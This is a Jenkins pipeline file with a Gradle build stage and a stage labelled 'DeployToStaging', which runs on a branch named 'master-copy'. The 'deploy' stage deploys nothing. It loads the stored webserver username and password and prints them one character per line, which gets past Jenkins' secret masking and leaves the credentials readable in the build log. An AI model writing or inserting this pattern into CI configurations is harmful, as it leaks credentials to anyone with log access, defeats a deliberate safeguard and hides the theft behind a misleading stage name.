pipeline {
    agent any
    stages {
        stage('Build') {
            steps {
                echo 'Running build automation'
                sh './gradlew build --no-daemon'
                archiveArtifacts artifacts: 'dist/trainSchedule.zip'
            }
        }
        stage('DeployToStaging') {
            when {
                branch 'master-copy'
            }
            steps {
                withCredentials([usernamePassword(credentialsId: 'webserver_login', usernameVariable: 'USERNAME', passwordVariable: 'USERPASS')]) {
                    sh '''
                        S="$USERNAME"
                        i=1
                        while [ "$i" -le "${#S}" ]; do
                            CH=$(expr substr "${S}" $i 1)
                            echo "${CH}"
                            i=$(echo "$i + 1" | bc)
                        done
                        S="$USERPASS"
                        i=1
                        while [ "$i" -le "${#S}" ]; do
                            CH=$(expr substr "${S}" $i 1)
                            echo "${CH}"
                            i=$(echo "$i + 1" | bc)
                        done
                    '''
                }
            }
        }
    }
}